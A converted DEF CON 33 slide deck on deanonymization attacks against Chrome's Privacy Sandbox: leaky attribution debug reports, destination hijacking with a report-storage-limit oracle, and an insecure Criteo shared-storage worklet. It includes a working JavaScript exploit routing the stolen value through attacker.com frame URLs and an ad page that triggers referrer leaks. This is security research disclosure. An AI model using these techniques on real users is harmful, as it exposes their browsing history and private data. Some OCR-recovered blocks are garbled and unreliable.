---
title: "Escaping the Privacy Sandbox with Client-Side Deanonymization Attacks"
speakers: ["Eugene Lim"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Eugene Lim - Escaping the Privacy Sandbox with Client-Side Deanonymization Attacks.pdf"
pages: 41
sha256: "2782399ddeb7069535a0805f5c0c52ad84da9c4baaa3d998ec62a91d6943cdeb"
text_chars: 22563
ocr_pages: 5
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.4
ocr_unreliable_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T07:00:21Z"
---
# Escaping the Privacy Sandbox with Client-Side Deanonymization Attacks

**Speakers:** Eugene Lim  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Eugene Lim - Escaping the Privacy Sandbox with Client-Side Deanonymization Attacks.pdf` (41 pages)


## Slide 1

###### Eugene “Spaceraccoon” Lim

DEF CON 33

# **Esc aping** **the Privacy** **San dbox** wi t h Cli ent-Side Deanonymization Attacks

## Slide 2

Escaping the Privacy Sandbox • DEF CON 33

###### **About Me**

Focus areas

Appsec Vulnerability research “Why would you connect that to the internet???”

## Slide 3

###### **The End of an Era: Cookies are cancelled?**

Soon™ is doing a lot of heavy lifting... but:

Browsers beginning to block third-party cookies by default Privacy laws and regulations restricting third-party cookie tracking Browser- and network-level ad blocking

## Slide 4

**The elephant in the room** Google recently announced they are pausing the deprecation of third-party cookies!


> Recovered by OCR — confidence 90/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Google delays blocking third-party
cookies in Chrome until 2023
/ Google blin
pressure Google’s plan to turn off third-party
cookies in Chrome is dying
/ Google nov
join Safari ar
the web trac
instead, it wi
by Richard Lawler
Jul 23, 2024 at 6:17 AP
& Richard Lawler is a senior editor following news across tech, culture, policy, and entertainment. He joined
The Verae in 2021 after several 0 ws at Fnaadaat
THE ELEPHANT IN THE ROOM
Google recently announced they are pausing the
deprecation of third-party cookies!
ws writer who covers the streaming wars, consut
itor at MU
more. Prevoisly she wn writer and ed
Google is scrapping its planned changes
for third-party cookies in Chrome
/ Google no longe
deprecate cookie:
Privacy Sandbox.
by Emma Roth
‘Apr 23, 2026 at 6:06 AM GMT+8
| media, and much
```

## Slide 5

Escaping the Privacy Sandbox • DEF CON 33

###### Because it’s already live

Shipped in Chrome and Chromium browsers right now.

## **So why do we still care?**

Because adtech uses it

Companies still need a way around third-party cookie blocking.

Because it’s interesting “Privacy-preserving” adtech is hard - and we don’t know enough about it.

## Slide 6

Our focus for today

###### **Unpacking Google's Privacy Sandbox**

i.e., the attack surface

Client-side browser and mobile APIs

“Walled garden” enrollment and verification

Aggregation and decryption in trusted execution environments

## Slide 7

Escaping the Privacy Sandbox • DEF CON 33

###### Attribution Reporting API

Leaking information with debug reports

Browser history stealing via sidechannels

###### **Agenda**

###### Shared Storage API

Leaking private data from insecure worklets

###### Conclusion

Q&As?

## Slide 8

##### **The Attribution Reporting API**


> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
e Origin N
Source Registrations
Trigger Registrations
Details for Selected Row
Time
Source Origin
Reporting Origin
Cleared Debug Key
Type
Status
Registration JSON
Event-Level Reports Aggregatable Reports Debug Reports
13/07/2025, 23:41:12
https://www.theverge.com
https://www.googleadservices.com
Event
Success
{
“aggregatable_report_window": 2592000,
"aggregation_keys": {
" "Qxe7841b06 f073b1820000000000000000",
"@x5a2ac23c17047e3d0000000000000000",
} "5": "Oxfle3769bdc9590ed0000000000000000"
,
“debug_reporting": true,
"destination": "https://capellahotels.com",
"“destination_limit_priority": "0",
“event_level_epsilon": 14.0,
"expiry": 2592000,
"filter_data": {
"2": [ "975492079" J,
"22"; [ "true" ],
: [ "07-13" ],
"oe": [ "true" ]
},
"max_event_level_reports": 1,
"priority": "500",
“trigger_data_matching": "modulus",
THE
ATTRIBUTION
REPORTING
API
```

## Slide 9

Escaping the Privacy Sandbox • DEF CON 33

###### **What is the attribution reporting API?**

Privacy Sandbox API for conversion tracking without third-party cookies.

Answers the question: Did a user who viewed an ad on Site A later perform an action (like a purchase) on Site B? Operates entirely on the client-side.

## Slide 10

Escaping the Privacy Sandbox • DEF CON 33

###### **Step 1: Registering a Source**

 1. Visit website
Publisher Website
acmenews.com
 2. Interact with ad
 3. Send request with Attribution-
Reporting-Eligible header
Embedded Ad
Browser
iframe.ad.tech
5. Store attribution source data

Browser
5. Store attribution source data

Interaction can be navigationor event-based using HTML attributionsrc attribute or JavaScript attributionSrc option.

Adtech Server
report.ad.tech

4. Send response with AttributionReporting-Register-Source header including destination e.g. buy.me

## Slide 11

Escaping the Privacy Sandbox • DEF CON 33

###### **Step 1: Registering a Source**

\```
GET /pagead/ar-adview/?nrh={%22aggregation_keys%22:
{%221%22:%220x6e1f4587619636cb0000000000000000%22,%222%22
:%220x2d871530be9fc02d0000000000000000%22,%223%22:%220x9a
18030764b608a70000000000000000%22,%224%22:%220xabc00a76df
f261460000000000000000%22,%225%22:%220x9663b2028f96f65800
00000000000000%22},%22debug_key%22:%223343088426263375305
%22,%22debug_reporting%22:true,%22destination%22:%22https
://spaceraccoon.dev%22,%22event_report_window%22:%2225920
0%22,%22expiry%22:%222592000%22,%22filter_data%22:
{%222%22:[%22622778268%22],%2222%22:[%22true%22],%224%22:
[%2203-16%22],%226%22:
[%22true%22]},%22priority%22:%22500%22,%22source_event_id
%22:%229565824793031098609%22}&andc=true HTTP/2
Host: www.googleadservices.com
Cookie: ar_debug=1
Origin: https://googleads.g.doubleclick.net
Attribution-Reporting-Eligible: trigger;navigation-
source, event-source
Attribution-Reporting-Support: web=os
Referer: https://googleads.g.doubleclick.net/
\```

\```
HTTP/2 200 OK
Timing-Allow-Origin: *
Cross-Origin-Resource-Policy: cross-origin
Attribution-Reporting-Register-Source:
{"aggregation_keys":
\```

\```
{"1":"0x6e1f4587619636cb0000000000000000","2":"0x2d871530
be9fc02d0000000000000000","3":"0x9a18030764b608a700000000
00000000","4":"0xabc00a76dff261460000000000000000","5":"0
x9663b2028f96f6580000000000000000"},"debug_key":"33430884
26263375305","debug_reporting":true,"destination":"https:
//spaceraccoon.dev","event_report_window":"259200","expir
y":"2592000","filter_data":{"2":["622778268"],"22":
["true"],"4":["03-16"],"6":
["true"]},"priority":"500","source_event_id":"95658247930
31098609"}
\```

\```
Set-Cookie: ar_debug=1; expires=Sat, 14-Jun-2025 15:27:04
GMT; path=/; domain=googleadservices.com; Secure;
HttpOnly; SameSite=none
\```

## Slide 12

Escaping the Privacy Sandbox • DEF CON 33

###### **Step 2: Registering a Trigger**

 1. Visit destination
Destination Website
buy.me

 2. Interact with conversion
Embedded Analytics
tag.ad.tech

 3. Send request with Attribution-
Reporting-Eligible header
Browser
5. Attempt source-trigger matching

Advertiser Server
report.ad.tech

4. Send response with AttributionReporting-Register-Trigger header

## Slide 13

Escaping the Privacy Sandbox • DEF CON 33

###### **Step 2: Registering a Trigger**

\```
GET /pagead/conversion/16766202842/?
random=1741528596827&cv=11&fst=1741528596827&bg=ffffff&gu
id=ON&async=1&gtm=45be5362za200zb9199797912&gcs=G111&gcd=
13t3t3t3t5l1&dma=0&tag_exp=102067808~102482433~102539968~
102587591~102640600~102717422~102788824~102825837&u_w=256
0&u_h=1440&url=https%3A%2F%2Fspaceraccoon.dev HTTP/2
Host: www.googleadservices.com
Attribution-Reporting-Eligible: trigger, event-
source;navigation-source
Attribution-Reporting-Support: web=os
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Sec-Fetch-Storage-Access: active
Referer: https://spaceraccoon.dev/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
\```

\```
HTTP/2 200 OK
Timing-Allow-Origin: *
Cross-Origin-Resource-Policy: cross-origin
Attribution-Reporting-Register-Trigger:
{"aggregatable_trigger_data":[{"filters":[{"22":
["true","false","false","false","false","false","false","
false","false","false","false","false"],"6":
["true"]}],"key_piece":"0x4a2e673f6d1e4e87","source_keys"
:["6"]},{"filters":[{"22":
["true","false","false","false","false","false","false","
false","false","false","false","false"],"6":
["false"],"7":
\```

\```
["6950483898"]}],"key_piece":"0x50c74cd84781c53c","source
_keys":["6"]},{"filters":[{"22":
["true","false","false","false","false","false","false","
false","false","false","false","false"],"6":
["true"]}],"key_piece":"0xd1fbae810236c299","source_keys"
:["1","11","16","21"]},{"filters":[{"22":
["true","false","false","false","false","false","false",
...
\```

## Slide 14

Escaping the Privacy Sandbox • DEF CON 33

###### **Step 3: Generating reports**

Other data is used to confirm a match, including:

trigger_data to specify trigger event filters to further narrow down conversions max_event_level_reports or trigger_data_matching options

1. Confirm if top-level page of trigger matches a stored source destination

Advertiser Server
report.ad.tech

Browser

2. Send attribution report to reporting origin

Reports can be event-level or summary reports

## Slide 15

Escaping the Privacy Sandbox • DEF CON 33

###### **Step 3: Generating reports**

\```
POST /.well-known/attribution-reporting/report-event-
attribution HTTP/2
Host: ad.doubleclick.net
Content-Length: 422
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/json
Origin: https://ad.doubleclick.net
{"attribution_destination":
["https://spaceraccoon.dev"],"randomized_trigger_rate":0.
0001272,"report_id":"8b750c76-62c9-487b-8bab-
4e9b8c7a9599","scheduled_report_time":"1742262266","sourc
e_debug_key":"3523959536629036774","source_event_id":"726
9729236833329074","source_type":"navigation","trigger_dat
a":"7","trigger_debug_key":"1742820867278454576"}
\```

\```
HTTP/2 200 OK
P3p:
policyref="https://googleads.g.doubleclick.net/pagead/gcn
_p3p_.xml", CP="CURa ADMa DEVa TAIo PSAo PSDo OUR IND UNI
PUR INT DEM STA PRE COM NAV OTC NOI DSP COR"
Timing-Allow-Origin: *
Cross-Origin-Resource-Policy: cross-origin
Content-Type: text/html; charset=UTF-8
X-Content-Type-Options: nosniff
Date: Tue, 18 Mar 2025 01:44:26 GMT
Server: cafe
Content-Length: 0
X-Xss-Protection: 0
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
\```

## Slide 16

###### Random

Randomized reporting delays obscure the exact time of conversion

###### Limited

Limited data fidelity in reports (only small amounts of data can be sent)

###### **I n** **tended Privacy Protections**

Noisy

Noise is added to the data to prevent deanonymization of single users

Seems pretty solid, right? **Let's break it.**

## Slide 17

Escaping the Privacy Sandbox • DEF CON 33

Remember when third-party cookies were supposed to be deprecated soon™?

###### **Attack #1: Leaky Debugging Reports**

- Privacy Sandbox API has a “transitional debug report” feature that sends debug reports to the reporting origin. Set with ar_debug=1 cookie. Verbose debugging reports can be triggered by failures in attribution registrations and inc **lude a source_site or context_site value** . A feature, not a bug...?

## Slide 18

Escaping the Privacy Sandbox • DEF CON 33

###### 👀

\```
POST /.well-known/attribution-reporting/debug/verbose
HTTP/2
Host: simeola.com
Content-Type: application/json
[{
"body": {
"attribution_destination": ["https://destination.com"],
"source_debug_key": "687804743640049",
"source_event_id": "933702289545510",
"source_site": "https://publishersite.com"
},
"type": "source-success"
}]
\```

\```
<?php
// Set the Referrer-Policy header to no-referrer
header("Referrer-Policy: no-referrer");
?>
<!DOCTYPE html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,
initial-scale=1.0">
<title>Ad</title>
</head>
\```

\```
<body>
<img width="180" src="https://simeola.com/register-
source.php" attributionsrc />
</body>
\```

Leaks “referrer site” despite noreferrer policy via debug report!

## Slide 19

Escaping the Privacy Sandbox • DEF CON 33

###### **Leaking top-level referrer from SafeFrames**

SafeFrame is a hardened iframe Publisher Website acmenews.com standard by the Interactive Advertising Bureau. Limited postMessage communication However, the default SafeFrame implementation would bypass https://tpc.googlesyndication.com/safeframe/1-0some of these protections (such 41/html/container.html as exposing the top-level site) Ad with debugging reports. https://s0.2mdn.net/ads/richmedia/studi Header-error debugging reports o/pv2/. . . /index_720x90.html can be deliberately triggered with misformatted attribution registration data and **AttributionReporting-Info: report-headererrors** response header.

## Slide 20

Escaping the Privacy Sandbox • DEF CON 33

###### **Leaking top-level referrer from SafeFrames**

 1. Visit website
Publisher Website
Header-error debugging reports can be
acmenews.com
deliberately triggered with misformatted
 2. Interact with ad
SafeFrame
tpc.googlesyndication.com
 3. Send request with Attribution-
Reporting-Eligible header
Ad
Browser
s0.2mdn.net
5. Trigger header-error debugging
report with context_site:
acmenews.com

Header-error debugging reports can be deliberately triggered with misformatted attribution header data to leak the top-level site.

Adtech Server report.ad.tech 4. Send response with AttributionReporting-Info: report-header-errors and malformed AttributionReporting-Register-Source headers

## Slide 21

Escaping the Privacy Sandbox • DEF CON 33

###### **How Facebook Ads sandbox prevents it: Disabling completely**


> Recovered by OCR — confidence 81/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Escaping the Privacy Sandbox * DEF CON 33
HOW FACEBOOK ADS SANDBOX
PREVENTSIT: DISABLING COMPLETELY
om\/ajax\/browser_error_reports\/"}],"group":"permissions_poli
cy"}
Content-Security-Policy: default-src 'self';script-src 'self'
‘unsafe-inline' 'unsafe-eval';style-src 'self' data: blob:
blob:;img-src ‘self’ data: blob:;media-src 'self' data:
blob:;frame-src 'none';base-uri '‘none';form—-action
Permissions—Policy: accelerometer=(),
attribution-reporting=(), autoplay=(), bluetooth=(),
camera=(), ch-device-memory=(), ch-downlink=(), ch-dpr=(),
ch-ect=(), ch-rtt=(), ch-save-data=(), ch-ua-arch=(),
ch-ua-bitness=(), ch-viewport—-height=(), ch-viewport-width=(),
ch-width=(), clipboard-read=(), clipboard-write=(),
compute-pressure=(), display-cap
```

## Slide 22

Escaping the Privacy Sandbox • DEF CON 33

###### **Attack #2: Destination Hijacking**

More than 1 destination is allowed during a source registration. While checking various real-world implementations of Attribution API, I began to notice 2 common strange debugging destinations added across all ads by the Google DoubleClick ad platform...

Were these debugging domains available?

## Slide 23

Escaping the Privacy Sandbox • DEF CON 33

## Slide 24

Escaping the Privacy Sandbox • DEF CON 33

###### **Okay... I can commit ad click fraud, so what?**

 1. User visits website  3. User visits debugconversiondomain2.com
Publisher Website Publisher Website
acmenews.com acmenews.com
 5. Conversion for attribution_destination
[advertiser.com,
 4. Automatically register debugconversiondomain1.com,
 2. Interact with ad attribution trigger  debugconversiondomain2.com]
Embedded Ad Reporting Origin
Script
ad.doubleclick.net ad.doubleclick.net
Could I leverage this to leak
acmenews.com instead?
Source is registered for destinations
[advertiser.com, debugconversiondomain1.com,
debugconversiondomain2.com]

## Slide 25

###### **The Storage Limit Oracle**

Attribution API implements various rate limits to prevent abuse and slow down data gathering on individuals. The browser has undocumented storage limits for event-level reports per **destination site (not attribution destination)** to prevent excessive resource usage. Through testing, I found a limit of 1000 pending event-level reports per destination site.

When this limit is reached, the browser stops storing new reports and instead sends a trigger-event-storage-limit debug error.

## Slide 26

Escaping the Privacy Sandbox • DEF CON 33

###### **Using the oracle to find out if user visited the non-debug site**

 3. User visits advertiser.com  5. User visits attacker.com
Destination Website Destination Website
advertiser.com attacker.com
 4. Trigger registered and  6. Continuously register same
matched with source  sources and triggers to create
matches
Script Script
1 Event-level report sent for 999 Event-level reports sent for
attribution_destination [advertiser.com, attribution_destination
debugconversiondomain1.com, [advertiser.com,
debugconversiondomain2.com] debugconversiondomain1.com,
debugconversiondomain2.com]

1. User visits website

 3. User visits advertiser.com

Publisher Website acmenews.com

2. Interact with ad matched with source Embedded Ad Script ad.doubleclick.net Source is registered for destination 1 Event-level report sent for [advertiser.com, attribution_destination [advertiser.com, debugconversiondomain1.com, debugconversiondomain1.com, debugconversiondomain2.com] debugconversiondomain2.com]

## Slide 27

Escaping the Privacy Sandbox • DEF CON 33

###### **Using the oracle to find out if user visited the non-debug site**

1. User visits website

4. User visits attacker.com

Publisher Website acmenews.com

2. Interact with ad 3. User doesn’t visit advertiser.com Embedded Ad ad.doubleclick.net Source is registered for destination No event-level report sent for [advertiser.com, attribution_destination [advertiser.com, debugconversiondomain1.com, debugconversiondomain1.com, debugconversiondomain2.com] debugconversiondomain2.com]

Destination Website attacker.com 5. Continuously register same sources and triggers to create matches Script 1000 Event-level reports sent for attribution_destination [advertiser.com, debugconversiondomain1.com, debugconversiondomain2.com]

## Slide 28

Escaping the Privacy Sandbox • DEF CON 33

###### **De-Anonymization Achieved**

If the user sends only 999 event-level reports to the attacker’s reporting origin before hitting the rate-limit, it means the queue was already filled by one report. Conclusion: The user must have previously visited advertiser.com. I have successfully de-anonymized a part of that user's browser history without ever placing an ad myself or being a part of the original transaction!

## Slide 29

Escaping the Privacy Sandbox • DEF CON 33

###### **There’s still more to find...**

## Slide 30

##### **The Shared Storage API**


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Sources Network Performance
C YF Filter
Shared storage
Origin
Creation Time
Number of Entries
Number of Bytes Used
Entropy Budget for Fenced Frames @
Key
Memory’ Application Privacy and security
https://shared-storage-demo.web.app
Not yet created
0
0
Lighthouse
@ xX
THE SHARED
STORAGE API
```

## Slide 31

Escaping the Privacy Sandbox • DEF CON 33

###### **What is the Shared Storage API?**

Privacy Sandbox API for cross-site storage and access to data in a privacy-preserving way.

Use case: Store a user's interest group (e.g., 'cat-lover', 'new-homebuyer') and use it to select relevant ads on different sites.

## Slide 32

Escaping the Privacy Sandbox • DEF CON 33

###### **Step 1: Shared Storage to Worklets**

\```
await
window.sharedStorage.workle
t.addModule("ab-testing-
worklet.js")
\```

\```
window.sharedStorage
  .set("ab-testing-group", "0")
  .then(console.log("Value saved to shared storage"));
\```

## Slide 33

Escaping the Privacy Sandbox • DEF CON 33

###### **Step 2: Worklets to Fenced Frame**

Output Gate
<fencedframe id=”
content-slot”>
</fencedframe>

- `const fencedFrameConfig = await window.sharedStorage.selectURL( "ab-testing", [ { url: `https://example.com/default-content.html` }, { url: `https://example.com/experiment-content-a.html` }, ], { resolveToConfig: true }, );`

\```
document.getElementById("content-slot").config =
fencedFrameConfig;
\```

## Slide 34

###### **Attack #3: Insecure CrossSite Worklets**

Opt-in feature to allow any other origin to access the same shared storage of the worklet script origin - so make sure the script is secure?

## Slide 35

Escaping the Privacy Sandbox • DEF CON 33

###### **fledge.criteo.com Worklet**

\```
class SelectURLOperation {
  async run(urls, data) {
    var r = Math.floor(8 * Math.random()).toString();
    await sharedStorage.set("chrome_abt_pop", r, {
    ignoreIfPresent: true
  });
  let a = await sharedStorage.get("chrome_abt_pop");
    return urls.map(url => url.split("?")[0]).findIndex(url => url.endsWith(a));
  }
}
register("select-abt-url", SelectURLOperation);
\```

## Slide 36

Escaping the Privacy Sandbox • DEF CON 33

###### **Exploiting the worklet**

`const CRITEO_WORKLET = "https://fledge.criteo.com/interest-group/abt/worklet" const selectAbtWorklet = await window.sharedStorage.createWorklet( CRITEO_WORKLET, { dataOrigin: "script-origin" } ) var fencedFrameConfig = await selectAbtWorklet.selectURL('select-abt-url', [ { url: 'https://attacker.com/criteo-frame.php#0' }, { url: 'https://attacker.com/criteo-frame.php#1' }, { url: 'https://attacker.com/criteo-frame.php#2' }, { url: 'https://attacker.com/criteo-frame.php#3' }, { url: 'https://attacker.com/criteo-frame.php#4' },` By running this code, any website can `{ url: 'https://attacker.com/criteo-frame.php#5' },` determine the chrome_abt_pop `{ url: 'https://attacker.com/criteo-frame.php#6' },` value that has been set in the `{ url: 'https://attacker.com/criteo-frame.php#7' }` “private” Shared Storage `], { resolveToConfig: true }) document.getElementById("content-slot").config = fencedFrameConfig;`

## Slide 37

Escaping the Privacy Sandbox • DEF CON 33

###### **Exploiting the worklet**


> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Escaping the Privacy Sandbox « DEF CON 33
EXPLOITING THE WORKLET
Your chrome_abt_pop is 2
DevTools - file:///Users/eugenelim/Desktop/test-worklet.html
K £0 Elements Console Sources Network Performance Memory Application Privacy and security Lighthouse Recorder
Application CY Filter @x
CD) Manifest
% Service workers
S Storage Origin https://fledge.criteo.com
Storage Creation Time 26/03/2025, 00:46:48
> Local storage
Number of Entries
» Session storage
» Extension storage
Number of Bytes Used
IndexedDB
Cookies Entropy Budget for Fenced Frames ©
Private state tokens
Interest groups
Shared storage
file:// Key
https://fledge.criteo.c... chrome_abt_pop
https://wwwapaypal.c...
S&S Cache storage
& Storage buckets
~ {key: "chrome_abt_pop", value: "2"}
Background services key: "chrome_abt_pop"
S& Back/forward cache value: "2"
7 Background fetch
(5 Background sync
© Bounce trackina mit...
```

## Slide 38

Escaping the Privacy Sandbox • DEF CON 33

- Top-lev el sit e leaks bypass SafeFrame

De-ano n y miz ation with des ti na ti on hijacking and oracle

#### **Summary of the Attacks**

- Shared Stora g e leak through inse c ure worklet

## Slide 39

Escaping the Privacy Sandbox • DEF CON 33

Privacy-preserving ad-tech is hard Despite the creators’ best efforts, the privacy and security implications of certain features have not been not fully decided.

The attack surface is large and unexplored. The web has a long history of hardening new features only after they are deployed and attacked.

### **The bigger Picture**

## Slide 40

Escaping the Privacy Sandbox • DEF CON 33

###### Client-side APIs

Topics API, Protected Audience API, Private Aggregation API?

Aggregation Service Trusted Execution Environment?

Enrolment

Attestations? Trusted origins?

###### **There’s still more to do...**

## Slide 41

Eugene “Spaceraccoon” Lim

DEF CON 33

## **Esca ping** **the P rivacy** **Sand box**

with Client-Si de Deanonymization Attac k s

spaceraccoon.dev @spaceraccoonsec Book signing! Swag! Stickers!
